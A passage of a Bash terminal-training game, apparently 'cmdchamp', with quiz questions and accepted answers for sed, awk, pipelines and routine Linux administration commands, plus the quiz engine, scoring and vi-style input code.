  questions+=("Replace only on lines matching|sed '/error/s/foo/bar/g' ${log}")
  questions+=("Insert line before match|sed '/pattern/i\\new line' ${txt}")
  questions+=("Insert line after match|sed '/pattern/a\\new line' ${txt}")
  questions+=("Change entire matching line|sed '/pattern/c\\replacement line' ${txt}")
  questions+=("Multiple sed commands|sed -e 's/a/b/' -e 's/c/d/' ${txt}")
  questions+=("Sed with address range|sed '5,10s/old/new/g' ${txt}")
  questions+=("Delete from line 5 to pattern|sed '5,/pattern/d' ${txt}")
  questions+=("Transform case (lowercase)|sed 's/.*/\\L&/' ${txt}")
  questions+=("Transform case (uppercase)|sed 's/.*/\\U&/' ${txt}")
  questions+=("Capitalize first letter|sed 's/.*/\\u&/' ${txt}")

  # Advanced awk
  questions+=("Print lines where field > value|awk -F',' '\$3 > 100' ${csv}")
  questions+=("Print unique values from column|awk -F',' '!seen[\$1]++' ${csv}")
  questions+=("Sum column values|awk -F',' '{sum+=\$2} END{print sum}' ${csv}")
  questions+=("Calculate average|awk -F',' '{sum+=\$2; n++} END{print sum/n}' ${csv}")
  questions+=("Find max value in column|awk -F',' 'BEGIN{max=0} \$2>max{max=\$2} END{print max}' ${csv}")
  questions+=("Find min value in column|awk -F',' 'BEGIN{min=999999} \$2<min{min=\$2} END{print min}' ${csv}")
  questions+=("Group by and count|awk -F',' '{count[\$1]++} END{for(k in count) print k, count[k]}' ${csv}")
  questions+=("Conditional print|awk -F',' '\$3==\"active\" {print \$1, \$2}' ${csv}")
  questions+=("Print with custom separator|awk -F',' 'BEGIN{OFS=\"|\"} {print \$1,\$2}' ${csv}")
  questions+=("String functions: length|awk '{print length(\$0)}' ${txt}")
  questions+=("String functions: substr|awk '{print substr(\$0,1,10)}' ${txt}")
  questions+=("String functions: gsub|awk '{gsub(/old/,\"new\"); print}' ${txt}")
  questions+=("String functions: split|awk '{n=split(\$0,a,\":\"); print a[1]}' ${txt}")
  questions+=("Pattern range|awk '/start/,/end/' ${txt}")
  questions+=("Print line numbers|awk '{print NR\": \"\$0}' ${txt}")
  questions+=("Skip header line|awk 'NR>1' ${csv}")
  questions+=("Print every nth line|awk 'NR%${n}==0' ${txt}")
  questions+=("Reverse fields|awk '{for(i=NF;i>0;i--) printf \"%s \",\$i; print \"\"}' ${txt}")

  # Combining tools
  questions+=("Complex: extract, sort, count§grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' ${log} | sort | uniq -c | sort -rn")
  questions+=("Complex: top N by frequency§awk '{print \$1}' ${log} | sort | uniq -c | sort -rn | head -${n}")
  questions+=("Complex: join lines with comma|paste -sd',' ${txt}")
  questions+=("Complex: transpose columns|awk '{for(i=1;i<=NF;i++) a[NR,i]=\$i} END{for(j=1;j<=NF;j++){for(i=1;i<=NR;i++) printf a[i,j]\" \"; print \"\"}}' ${txt}")

  # Process substitution - advanced piping
  questions+=("Diff sorted contents of ${txt} and ${txt2}|diff <(sort ${txt}) <(sort ${txt2})")
  questions+=("Compare output of two commands|diff <(cmd1) <(cmd2)")
  questions+=("Feed command output as file to program|prog <(grep pattern ${log})")

  printf '%s\n' "${questions[@]}"
}

# Level 2: System Admin (daily drivers)
gen_level12() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx

  # Network diagnostics
  questions+=("Ping ${ip} 5 times|ping -c 5 ${ip}")
  questions+=("Ping ${ip} continuously|ping ${ip}")
  questions+=("Trace route to ${ip}|traceroute ${ip}|tracepath ${ip}")
  questions+=("DNS lookup for ${host}|dig ${host}|nslookup ${host}|host ${host}")
  questions+=("Reverse DNS lookup|dig -x ${ip}|host ${ip}")
  questions+=("Check if port ${port} is open on ${ip}|nc -zv ${ip} ${port}")
  questions+=("Show listening ports|ss -tlnp|netstat -tlnp")
  questions+=("Show all network connections|ss -tunapl|netstat -tunapl")
  questions+=("Show routing table|ip route|ip r")
  questions+=("Show network interfaces|ip addr|ip a")
  questions+=("Show interface ${iface} info|ip addr show ${iface}")
  questions+=("Bring interface ${iface} up|ip link set ${iface} up")
  questions+=("Add IP to interface|ip addr add ${ip}/24 dev ${iface}")

  # System monitoring
  questions+=("Show disk space usage|df -h")
  questions+=("Show memory usage|free -h")
  questions+=("Show system uptime|uptime")
  questions+=("Show system info|uname -a")
  questions+=("Show CPU info|lscpu|cat /proc/cpuinfo")
  questions+=("Show kernel messages|dmesg|dmesg -T")
  questions+=("Follow kernel messages|dmesg -w")
  questions+=("Interactive process viewer|top|htop|btop")
  questions+=("Show top 10 memory-hungry processes§ps aux --sort=-%mem | head -11")
  questions+=("Show top 10 CPU-hungry processes§ps aux --sort=-%cpu | head -11")
  questions+=("Show process tree|pstree|ps auxf")

  # Service management (systemd)
  questions+=("Check status of ${svc}|systemctl status ${svc}")
  questions+=("Start ${svc}|systemctl start ${svc}")
  questions+=("Stop ${svc}|systemctl stop ${svc}")
  questions+=("Restart ${svc}|systemctl restart ${svc}")
  questions+=("Enable ${svc} at boot|systemctl enable ${svc}")
  questions+=("Disable ${svc} at boot|systemctl disable ${svc}")
  questions+=("List running services|systemctl list-units --type=service --state=running")
  questions+=("List failed services|systemctl --failed")
  questions+=("Reload systemd daemon|systemctl daemon-reload")
  questions+=("Show ${svc} logs|journalctl -u ${svc}")
  questions+=("Follow ${svc} logs|journalctl -fu ${svc}")
  questions+=("Show logs since boot|journalctl -b")
  questions+=("Show last 100 log lines|journalctl -n 100")

  # User/permission management
  questions+=("Run command as root|sudo ${script}")
  questions+=("Switch to root shell|sudo -i|su -")
  questions+=("Switch to user ${user}|su - ${user}")
  questions+=("Add user ${user}|useradd -m ${user}|sudo useradd -m ${user}")
  questions+=("Delete user ${user}|userdel -r ${user}|sudo userdel -r ${user}")
  questions+=("Change password for ${user}|passwd ${user}|sudo passwd ${user}")
  questions+=("Add ${user} to group wheel|usermod -aG wheel ${user}")
  questions+=("List groups for ${user}|groups ${user}|id ${user}")
  questions+=("Change owner of ${txt} to ${user}|chown ${user} ${txt}")
  questions+=("Change owner and group|chown ${user}:${user} ${txt}")
  questions+=("Change owner recursively|chown -R ${user}:${user} ${dir}/")
  questions+=("Show current user|whoami")
  questions+=("Show user id info|id")

  # Package management (common patterns)
  questions+=("Update package lists (Arch)|pacman -Sy|paru -Sy")
  questions+=("Upgrade all packages (Arch)|pacman -Syu|paru -Syu")
  questions+=("Search for package|pacman -Ss ${term}|paru -Ss ${term}")
  questions+=("Show package info|pacman -Qi ${term}|paru -Qi ${term}")
  questions+=("List installed packages|pacman -Q|paru -Q")
  questions+=("Which package owns a file|pacman -Qo /usr/bin/${term}|paru -Qo /usr/bin/${term}")

  printf '%s\n' "${questions[@]}"
}

# ═══════════════════════════════════════════════════════════════════════════════
# QUESTION SYSTEM - Generate and manage questions per level
# ═══════════════════════════════════════════════════════════════════════════════

# Level descriptions
declare -A LEVEL_DESC=(
  [0]="First Commands" [1]="Save Output" [2]="Read Files" [3]="Basic Pipes"
  [4]="Input Redirection" [5]="Error Redirection" [6]="Logic Operators" [7]="Job Control"
  [8]="Variables" [9]="Special Variables" [10]="Test Operators"
  [11]="Core Tools" [12]="System Admin" [13]="tmux & Screen"
  [14]="Text Search" [15]="File Finding" [16]="Data Processing" [17]="String & Arrays"
  [18]="Control Flow" [19]="Batch Ops" [20]="Advanced Regex" [21]="Git"
  [22]="Network Tools" [23]="Network Scanning" [24]="Local Network & RF"
  [25]="Hash Cracking" [26]="Forensics" [27]="Privilege Escalation" [28]="Survival"
)

# Generate questions for a level (called once per level attempt)
declare -a CURRENT_QUESTIONS=()
generate_level() {
  local level=$1
  CURRENT_QUESTIONS=()
  local raw
  raw=$(gen_level${level})
  while IFS= read -r line; do
    [[ -n "$line" ]] && CURRENT_QUESTIONS+=("$line")
  done <<< "$raw"
}

# ═══════════════════════════════════════════════════════════════════════════════
# CORE ENGINE (mostly unchanged from original)
# ═══════════════════════════════════════════════════════════════════════════════

# Normalize flags: -la == -al == -a -l
norm() {
  local parts flags=() args=() out p
  read -ra parts <<< "$1"; out="${parts[0]}"
  for p in "${parts[@]:1}"; do
    if [[ "$p" == -* ]]; then
      [[ "$p" =~ ^-[a-zA-Z]+$ && ${#p} -gt 2 ]] && { for ((j=1;j<${#p};j++)); do flags+=("-${p:j:1}"); done; } || flags+=("$p")
    else args+=("$p"); fi
  done
  readarray -t flags < <(printf '%s\n' "${flags[@]}"|LC_ALL=C sort)
  printf '%s' "$out"; printf ' %s' "${flags[@]}" "${args[@]}"; echo
}

_SANDBOX_OUTPUT=""  # Store output for display after check
check() {
  local inp="${1#"${1%%[![:space:]]*}"}" a b ninp; inp="${inp%"${inp##*[![:space:]]}"}"; ninp=$(norm "$inp")
  _SANDBOX_OUTPUT=""

  # Sandbox mode: execute command and validate output/state
  if ((SANDBOX_MODE && !_qtext)); then
    local output
    output=$(_sandbox_exec "$inp" 5 2>&1)
    _SANDBOX_OUTPUT="$output"

    # Track destructive commands for reset
    _is_destructive "$inp" && _SANDBOX_DESTRUCTIVE=1

    # Validate based on markers
    if [[ -n "$_qoutput" ]]; then
      _sandbox_check_output "$output" "$_qoutput" && return 0
    fi
    if [[ -n "$_qstate" ]]; then
      _sandbox_check_state "$_qstate" && return 0
    fi

    # Fall through to text matching if no markers or sandbox failed
  fi

  # Text matching fallback (§ delimiter for questions with pipes, | for legacy)
  local delim='|'; [[ "$2" == *§* ]] && delim='§'
  local -a opts; IFS="$delim" read -ra opts <<< "$2"
  for a in "${opts[@]}"; do
    b="${a#"${a%%[![:space:]]*}"}"; b="${b%"${b##*[![:space:]]}"}"
    # ~pattern = regex match
    if [[ "$b" == ~* ]]; then
      [[ "$inp" =~ ${b:1} ]] && return 0
    else
      [[ "$inp" == "$b" || "$ninp" == "$(norm "$b")" ]] && return 0
    fi
  done; return 1
}

LVL=0 QI=0 HINT=false PROG=0 TOT=0
load() { [[ -f "$DATA/session.json" ]] && { local t=$(<"$DATA/session.json"); LVL="${t#*\"level\":}"; LVL="${LVL%%[!0-9]*}"; [[ "$t" == *'"qi":'* ]] && { QI="${t#*\"qi\":}"; QI="${QI%%[!0-9]*}"; }; }; LVL=${LVL:-0}; QI=${QI:-0}; }
save() { printf '{"level":%d,"qi":%d}\n' "$LVL" "$QI" > "$DATA/session.json"; }
# Score tracking: tier 1=blank, 2=recall (md5 hash keys avoid regex issues)
_hash() { local h; h=$(printf '%s' "$1"|md5sum); echo "${h:0:16}"; }

stats() {
  local -A sc; [[ -f "$DATA/scores" ]] && while IFS='|' read -r k v; do sc[$k]=$v; done < "$DATA/scores"
  echo -e "${B}Mastery Stats${N}"
  echo -e "${D}Stats show unique prompts seen${N}\n"
  local total_seen=0 total_t1=0 total_t2=0
  for k in "${!sc[@]}"; do
    case "${sc[$k]}" in 1) ((++total_t1));; *) ((++total_t2));; esac
    ((++total_seen))
  done
  echo -e "Total: ${B}${total_seen}${N}  ${Y}${total_t1}${N} learning  ${G}${total_t2}${N} mastered"
  echo
  for lv in {0..28}; do printf "  ${C}%2d${N} %s\n" "$lv" "${LEVEL_DESC[$lv]}"; done
}

# Tier display: removed - pure recall, Tab for hints
show_tier() { :; }

input="" cursor=0 mode="insert" SHOW_HINT=0 EXPLAIN_LINES=0 _rep=""
declare -a UNDO_STACK=()  # Multi-level undo
_last_cmd="" _last_arg=""  # For dot repeat
clear_hint() { for ((i=0;i<=EXPLAIN_LINES;i++)); do printf '\e[A\e[2K'; done; printf '\r'; }
hdr() {
  printf '\e[2J\e[H'
  local fire=""; ((streak>=5)) && fire="  ${R}🔥${N} ${Y}2x${N}"
  echo -e "${B}=== Level $1 ===${N}${fire}"
  echo -e "${M}${LEVEL_DESC[$1]}${N}"
  echo -e "${D}[$2/$3]  Tab=hint Ctrl+n=skip${N}\n"
}
qdisp() { bar; echo -e "\n${C}$1${N}"; show_tier "$2" "$3"; echo; }
bar() { local f e; printf -v f '%*s' "$PROG" ''; printf -v e '%*s' "$((TOT-PROG))" ''; printf "${G}[${Y}%s${D}%s${G}]${N}" "${f// /█}" "${e// /░}"; }
draw() {
  echo -ne "\e[?25l\r\e[K"  # hide cursor, clear line
  if ((SHOW_HINT)); then
    echo -ne "${D}$PROMPT_CHAR${ans}${N}"
  else
    ((VI_MODE)) && [[ $mode != insert ]] && echo -ne "\e[91m$PROMPT_CHAR\e[0m" || echo -ne "\e[97m$PROMPT_CHAR\e[0m"
    echo -n "$input"
    # Use display width for UTF-8 correct cursor positioning
    local disp_len=$(_dispwidth "$input") disp_cur=$(_dispwidth "${input:0:cursor}")
    ((disp_cur < disp_len)) && echo -ne "\e[$((disp_len - disp_cur))D"
  fi
  echo -ne "\e[?25h"  # show cursor
}

# Display width (character count, not bytes)
_dispwidth() { echo ${#1}; }

# Vi helpers (byte-indexed; UTF-8 multi-byte chars may cause cursor drift)
_wfwd() { while ((cursor<${#input})) && [[ "${input:cursor:1}" != " " ]]; do ((++cursor)); done; while ((cursor<${#input})) && [[ "${input:cursor:1}" == " " ]]; do ((++cursor)); done; ((cursor>=${#input}&&${#input}>0)) && cursor=$((${#input}-1)); }
_wbck() { ((cursor>0)) && ((cursor--)); while ((cursor>0)) && [[ "${input:cursor:1}" == " " ]]; do ((cursor--)); done; while ((cursor>0)) && [[ "${input:cursor-1:1}" != " " ]]; do ((cursor--)); done; }
_wend() { ((cursor<${#input}-1)) && ((++cursor)); while ((cursor<${#input}-1)) && [[ "${input:cursor:1}" == " " ]]; do ((++cursor)); done; while ((cursor<${#input}-1)) && [[ "${input:cursor+1:1}" != " " ]]; do ((++cursor)); done; }
_clamp() { ((cursor>=${#input}&&cursor>0)) && cursor=$((${#input}-1)); }
_del() { # $1=motion
  local e=$cursor
  case "$1" in
    d|c) input="" cursor=0;;
    w) while ((e<${#input})) && [[ "${input:e:1}" != " " ]]; do ((++e)); done; input="${input:0:cursor}${input:e}";;
    b) ((e>0)) && ((e--)); while ((e>0)) && [[ "${input:e:1}" == " " ]]; do ((e--)); done; while ((e>0)) && [[ "${input:e-1:1}" != " " ]]; do ((e--)); done; input="${input:0:e}${input:cursor}"; cursor=$e;;
    \$) input="${input:0:cursor}";;
    0) input="${input:cursor}"; cursor=0;;
  esac; _clamp
}

run() {
  local lv=$1 shuf=() qi=${QI:-0} done=0 streak=0
  local -a HIST=() ; local HIST_IDX=0 HIST_SAVE=""
  # Save terminal state for clean restoration
  _stty_saved=$(stty -g 2>/dev/null) || _stty_saved=""

  # Initialize sandbox for this level
  ((SANDBOX_MODE)) && _sandbox_init

  generate_level "$lv"  # Generate fresh questions for this level
  local -A _sc; [[ -f "$DATA/scores" ]] && while IFS='|' read -r k v; do _sc[$k]=$v; done < "$DATA/scores"
  _sget() { local h=$(_hash "$1"); echo "${_sc[$h]:-1}"; }  # Default tier 1 (no braindead copy)
  _sset() {
    local h=$(_hash "$1"); _sc[$h]=$2
    # Atomic update with flock to prevent race conditions
    (
      flock -x 200
      sed -i "/^$h|/d" "$DATA/scores" 2>/dev/null
      echo "$h|$2">>"$DATA/scores"
    ) 200>"$DATA/scores.lock"
  }
  TOT=${#CURRENT_QUESTIONS[@]}; PROG=$qi
  # Prioritize by tier: 1 (blank) > 2 (recall) - no tier 0 copy mode
  local t1=() t2=()
  for q in "${CURRENT_QUESTIONS[@]}"; do
    _qparse "$q"
    case "$(_sget "$_qprompt")" in 1) t1+=("$q");; *) t2+=("$q");; esac
  done
  # Shuffle and interleave: tier 1 first, mix in tier 2
  local _shuf1=() _shuf2=()
  ((${#t1[@]} > 0)) && readarray -t _shuf1 < <(printf '%s\n' "${t1[@]}" | LC_ALL=C shuf)
  ((${#t2[@]} > 0)) && readarray -t _shuf2 < <(printf '%s\n' "${t2[@]}" | LC_ALL=C shuf)
  shuf=()
  local i1=0 i2=0 idx=0
  while ((i1 < ${#_shuf1[@]} || i2 < ${#_shuf2[@]})); do
    if ((i1 < ${#_shuf1[@]})); then shuf+=("${_shuf1[$i1]}"); ((++i1))
    elif ((i2 < ${#_shuf2[@]})); then shuf+=("${_shuf2[$i2]}"); ((++i2))
    fi
    ((++idx))
  done
  while ((qi < ${#shuf[@]})); do
    # Reset sandbox if previous command was destructive
    ((SANDBOX_MODE && _SANDBOX_DESTRUCTIVE)) && { _sandbox_reset; _SANDBOX_DESTRUCTIVE=0; }

    _qparse "${shuf[$qi]}"; local prompt=$_qprompt ans=$_qans
    local tier; tier=$(_sget "$prompt")
    # Fire mode: force tier 2 (pure recall, no hints)
    ((streak>=5)) && tier=2
    HINT=false SHOW_HINT=0 EXPLAIN_LINES=0
    hdr "$lv" "$((qi+1))" "$TOT"; qdisp "$prompt" "$tier" "$ans"
    while true; do
      input="" cursor=0 mode="insert" SHOW_HINT=0; UNDO_STACK=(); HIST_IDX=${#HIST[@]}; HIST_SAVE=""
      read -t 0.01 -rsn 1000 ||:
      draw
      while IFS= read -rsn1 c; do
        if [[ "$c" == $'\t' ]]; then
          # Toggle hint + explanation
          if ((SHOW_HINT)); then
            SHOW_HINT=0; clear_hint
          else
            SHOW_HINT=1; HINT=true; draw; echo; explain "$ans"; continue
          fi
          draw; continue
        fi
        if [[ "$mode" == "insert" ]]; then
          # Clear hint display if typing
          if ((SHOW_HINT)) && [[ "$c" != $'\x1b' && "$c" != '' ]]; then
            SHOW_HINT=0; clear_hint
          fi
          case "$c" in
            $'\x0e') echo -e "\n${D}[skipped]${N}"; ((++qi)); break 2;;  # Ctrl+N skip
            $'\x04') echo -e "\n${D}[quit]${N}"; exit 0;;  # Ctrl+D quit
            $'\x1b')  # ESC or arrow key
              local _e1 _e2; read -rsn1 -t 0.01 _e1 || _e1=""
              if [[ "$_e1" == "[" ]]; then
                read -rsn1 -t 0.01 _e2 || _e2=""
                case "$_e2" in
                  A)  # Up arrow - history back
                    if ((${#HIST[@]} > 0 && HIST_IDX > 0)); then
                      ((HIST_IDX == ${#HIST[@]})) && HIST_SAVE="$input"
                      ((HIST_IDX--)); input="${HIST[$HIST_IDX]}"; cursor=${#input}; draw
                    fi;;
                  B)  # Down arrow - history forward
                    if ((HIST_IDX < ${#HIST[@]})); then
                      ((++HIST_IDX))
                      if ((HIST_IDX == ${#HIST[@]})); then input="$HIST_SAVE"; else input="${HIST[$HIST_IDX]}"; fi
                      cursor=${#input}; draw
                    fi;;
                  *) ;;  # Ignore other sequences
                esac
              elif [[ -z "$_e1" ]] && ((VI_MODE)); then
                mode="normal"; ((cursor>0)) && ((cursor--)); draw
              fi;;
            $'\x7f'|$'\b') ((cursor>0)) && { input="${input:0:cursor-1}${input:cursor}"; ((cursor--)); draw; };;
            '') echo; break;;
            *) input="${input:0:cursor}${c}${input:cursor}"; ((++cursor)); draw;;
          esac
        elif ((VI_MODE)); then
          # Clear hint display if any vi command
          if ((SHOW_HINT)); then SHOW_HINT=0; clear_hint; fi
          # Number prefix: accumulate digits
          if [[ "$c" =~ ^[1-9]$ ]] || { [[ "$c" == "0" ]] && [[ -n "$_rep" ]]; }; then _rep+="$c"; continue; fi
          local _n=${_rep:-1}; _rep=""
          # Push to undo stack before destructive operations
          case "$c" in s|S|x|X|D|C|d|c|r) UNDO_STACK+=("$input:$cursor");; esac
          case "$c" in
            i) mode="insert"; draw;; a) mode="insert"; ((cursor<${#input})) && ((++cursor)); draw;;
            A) mode="insert"; cursor=${#input}; draw;; I) mode="insert"; cursor=0; draw;;
            s) ((${#input}>0)) && input="${input:0:cursor}${input:cursor+1}"; mode="insert"; draw;;
            S) input="" cursor=0 mode="insert"; draw;;
            h) for ((_i=0;_i<_n&&cursor>0;_i++)); do ((cursor--)); done; draw;;
            l) for ((_i=0;_i<_n&&cursor<${#input}-1;_i++)); do ((++cursor)); done; draw;;
            k) ((${#HIST[@]}>0&&HIST_IDX>0)) && { ((HIST_IDX==${#HIST[@]})) && HIST_SAVE="$input"; ((HIST_IDX--)); input="${HIST[$HIST_IDX]}"; cursor=${#input}; _clamp; draw; };;
            j) ((HIST_IDX<${#HIST[@]})) && { ((++HIST_IDX)); ((HIST_IDX==${#HIST[@]})) && input="$HIST_SAVE" || input="${HIST[$HIST_IDX]}"; cursor=${#input}; _clamp; draw; };;
            0) cursor=0; draw;; \$) cursor=$((${#input}>0?${#input}-1:0)); draw;;
            w) for ((_i=0;_i<_n;_i++)); do _wfwd; done; draw;;
            b) for ((_i=0;_i<_n;_i++)); do _wbck; done; draw;;
            e) for ((_i=0;_i<_n;_i++)); do _wend; done; draw;;
            f) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do for ((p=cursor+1;p<${#input};p++)); do [[ "${input:p:1}" == "$c2" ]] && { cursor=$p; break; }; done; done; draw;;
            F) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do for ((p=cursor-1;p>=0;p--)); do [[ "${input:p:1}" == "$c2" ]] && { cursor=$p; break; }; done; done; draw;;
            t) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do for ((p=cursor+1;p<${#input};p++)); do [[ "${input:p:1}" == "$c2" ]] && { cursor=$((p-1)); break; }; done; done; draw;;
            T) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do for ((p=cursor-1;p>=0;p--)); do [[ "${input:p:1}" == "$c2" ]] && { cursor=$((p+1)); break; }; done; done; draw;;
            x) for ((_i=0;_i<_n&&${#input}>0&&cursor<${#input};_i++)); do input="${input:0:cursor}${input:cursor+1}"; done; _clamp; draw;;
            X) for ((_i=0;_i<_n&&cursor>0;_i++)); do input="${input:0:cursor-1}${input:cursor}"; ((cursor--)); done; draw;;
            D) input="${input:0:cursor}"; ((cursor>0)) && ((cursor--)); draw;;
            C) input="${input:0:cursor}"; mode="insert"; draw;;
            r) IFS= read -rsn1 c2; [[ -n "$c2" && "$c2" != $'\x1b' ]] && { input="${input:0:cursor}${c2}${input:cursor+1}"; draw; };;
            d) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do _del "$c2"; done; draw;;
            c) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do _del "$c2"; done; mode="insert"; draw;;
            u) ((${#UNDO_STACK[@]}>0)) && { local _u="${UNDO_STACK[-1]}"; unset 'UNDO_STACK[-1]'; input="${_u%:*}"; cursor="${_u#*:}"; draw; };;  # multi-level undo
            g) IFS= read -rsn1 c2; [[ "$c2" == "g" ]] && { cursor=0; draw; };;  # gg = start
            G) cursor=$((${#input}>0?${#input}-1:0)); draw;;  # G = end
            n) echo -e "\n${D}[skipped]${N}"; ((++qi)); break 2;;  # skip in normal mode
            q) echo -e "\n${D}[quit]${N}"; exit 0;;  # quit
            \?) echo -e "\n${D}hl${N} move  ${D}kj${N}/↑↓ history  ${D}wb${N} word  ${D}fFtT${N}+char find  ${D}0\$/gg/G${N} line"; echo -e "${D}x/X${N} del char  ${D}dw/db/dd${N} del  ${D}cw/cb/cc${N} change  ${D}r${N} replace"; echo -e "${D}s/S${N} subst  ${D}i/a/I/A${N} insert  ${D}u${N} undo(stack)  ${D}n${N} skip  ${D}q${N} quit"; echo -e "${D}Tab${N} hint  ${D}Ctrl+n${N} skip  ${D}Ctrl+d${N} quit  ${D}[num]cmd${N} repeat"; read -rsn1; hdr "$lv" "$((qi+1))" "$TOT"; qdisp "$prompt" "$tier" "$ans"; draw;;
            '') echo; break;;
          esac
        fi
      done
      if check "$input" "$_qanswers"; then
        [[ -n "$input" ]] && { HIST+=("$input"); HIST_IDX=${#HIST[@]}; HIST_SAVE=""; }
        ((++PROG))
        # Show sandbox output prominently
        if [[ -n "$_SANDBOX_OUTPUT" ]]; then
          echo -e "\n${W}${_SANDBOX_OUTPUT}${N}"
        fi
        if $HINT; then
          echo -e "\n${Y}+1${N} ${D}(hint)${N}"; streak=0; _sset "$prompt" "$tier"
        elif ((streak>=5)); then
          ((++done)); ((++done)); echo -e "\n${R}${B}🔥 ON FIRE!${N} ${Y}+2${N}"; ((++streak)); _sset "$prompt" "$((tier<2?tier+1:2))"
        else
          ((++done)); echo -e "\n${G}${B}✓${N}"; ((++streak)); _sset "$prompt" "$((tier<2?tier+1:2))"
        fi
        read -rsp $'\e[2mPress Enter...\e[0m'  # pause to see output
        ((++qi)); QI=$qi; save; break
      else
        # Wrong answer - show expected with full breakdown
        if [[ -n "$_SANDBOX_OUTPUT" ]]; then
          echo -e "\n${D}output:${N} ${_SANDBOX_OUTPUT}"
        fi
        echo -e "${R}✗${N}  ${D}expected:${N} ${Y}${ans}${N}\n"
        explain "$ans"  # show full breakdown so they learn
        streak=0; _sset "$prompt" "$((tier>0?tier-1:0))"; read -rsp $'\e[2mPress Enter...\e[0m'
      fi
      tier=$(_sget "$prompt"); hdr "$lv" "$((qi+1))" "$TOT"; qdisp "$prompt" "$tier" "$ans"
    done
  done
  # === BOSS ROUND ===
  printf '\e[2J\e[H'
  echo -e "${R}${B}═══ BOSS ROUND ═══${N}"
  echo -e "${D}No hints! Prove you learned it.${N}\n"
  read -rsp $'\e[2mEnter to start...\e[0m'; echo

  # Pick 5 random questions
  local boss_q=() boss_correct=0 boss_total=5
  readarray -t boss_q < <(printf '%s\n' "${CURRENT_QUESTIONS[@]}" | shuf | head -$boss_total)

  for ((bi=0; bi<${#boss_q[@]}; bi++)); do
    _qparse "${boss_q[$bi]}"; local prompt=$_qprompt ans=$_qans
    printf '\e[2J\e[H'
    echo -e "${R}${B}═══ BOSS ${bi+1}/${boss_total} ═══${N}\n"
    echo -e "${C}${prompt}${N}\n"

    input="" cursor=0 mode="insert"
    draw
    while IFS= read -rsn1 c; do
      if [[ "$c" == $'\t' ]]; then
        echo -e "\n${R}No hints in boss mode!${N}"; sleep 0.5
        printf '\e[A\e[2K'; draw; continue
      fi
      if [[ "$mode" == "insert" ]]; then
        case "$c" in
          $'\x1b') ((VI_MODE)) && { mode="normal"; ((cursor>0)) && ((cursor--)); draw; } ;;
          $'\x7f'|$'\b') ((cursor>0)) && { input="${input:0:cursor-1}${input:cursor}"; ((cursor--)); draw; } ;;
          '') echo; break ;;
          *) input="${input:0:cursor}${c}${input:cursor}"; ((++cursor)); draw ;;
        esac
      elif ((VI_MODE)); then
        case "$c" in
          i) mode="insert"; draw;; a) mode="insert"; ((cursor<${#input})) && ((++cursor)); draw;;
          h) ((cursor>0)) && ((cursor--)); draw;; l) ((cursor<${#input}-1)) && ((++cursor)); draw;;
          0) cursor=0; draw;; \$) cursor=$((${#input}>0?${#input}-1:0)); draw;;
          x) ((${#input}>0)) && { input="${input:0:cursor}${input:cursor+1}"; }; draw;;
          '') echo; break ;;
        esac
      fi
    done

    if check "$input" "$_qanswers"; then
      ((++boss_correct))
      echo -e "${G}${B}✓${N}"
    else
      echo -e "${R}✗${N}  ${D}expected:${N} ${Y}${ans}${N}\n"
      explain "$ans"
    fi
    sleep 0.8
  done

  # Results
  printf '\e[2J\e[H'
  if ((boss_correct >= 4)); then
    echo -e "${G}${B}══ BOSS DEFEATED ══${N}"
    echo -e "${G}${boss_correct}/${boss_total}${N} correct!\n"
    ((lv<28)) && { echo -e "Enter for Level $((lv+1))..."; read -r; LVL=$((lv+1)); QI=0; save; run "$LVL"; } || echo -e "${G}${B}ALL COMPLETE - ELITE APOCALYPSE HACKER SUPREME${N}"
  else
    echo -e "${R}${B}══ BOSS WINS ══${N}"
    echo -e "${R}${boss_correct}/${boss_total}${N} - need 4 to pass\n"
    echo -e "${D}r = retry boss, p = practice level again${N}"
    read -rsn1 choice
    case "$choice" in
      r) QI=0; run "$lv" ;;  # restart triggers boss again
      *) QI=0; save; run "$lv" ;;  # practice
    esac
  fi
}

# Handle --no-sandbox flag
[[ "${1:-}" == "--no-sandbox" ]] && { SANDBOX_MODE=0; shift; }

case "${1:-}" in
  [0-9]|1[0-9]|2[0-8]) _tty; LVL=$1; QI=0; save; run "$LVL";;
  r|reset) rm -f "$DATA"/*.json "$DATA/scores" "$DATA/scores.lock"; rm -rf "$DATA/sandbox" "$DATA/sandbox.pristine" 2>/dev/null; echo "Reset.";;
  c|cleanup) [[ -f "$DATA/scores" ]] && { awk -F'|' '!seen[$1]++' "$DATA/scores" > "$DATA/scores.tmp" && mv "$DATA/scores.tmp" "$DATA/scores"; echo "Deduplicated scores."; } || echo "No scores file.";;
  s|stats) stats;;
  v|version|-v|--version) echo "cmdchamp 0.2";;
  h|help|-h|--help)
    echo -e "${B}cmdchamp${N} - CLI trainer"
    echo -e "${D}29 levels, spaced repetition, sandbox execution${N}"
    echo
    echo "Usage: cmdchamp [--no-sandbox] [level|command]"
    echo
    echo "Options:"
    echo "  --no-sandbox  Disable sandbox (text-match only)"
    echo
    echo "Commands:"
    echo "  0-28      Start specific level"
    echo "  n|new     Start fresh from level 0"
    echo "  s|stats   Show mastery statistics"
    echo "  r|reset   Reset all progress"
    echo "  c|cleanup Deduplicate score file"
    echo "  h|help    Show this help"
    echo
    echo "Controls:"
    echo "  Tab      Toggle hint + explanations"
    echo "  Ctrl+n   Skip question"
    echo "  Ctrl+d   Quit"
    echo "  ?        Show vi keybindings (in vi mode)"
    echo
    echo "Levels:"
    for lv in {0..28}; do
      printf "  %2d - %s\n" "$lv" "${LEVEL_DESC[$lv]}"
    done
    ;;
  n|new) _tty; LVL=0; QI=0; save; run "$LVL";;
  "") _tty; load; ((LVL>0||QI>0)) && { read -rp "Continue Level $LVL Q$((QI+1))? [Y/n] " yn; [[ "$yn" =~ ^[Nn] ]] && { LVL=0; QI=0; save; }; }; run "$LVL";;
  *) echo "Usage: cmdchamp [0-28|reset|stats|help|version]"; exit 1;;
esac
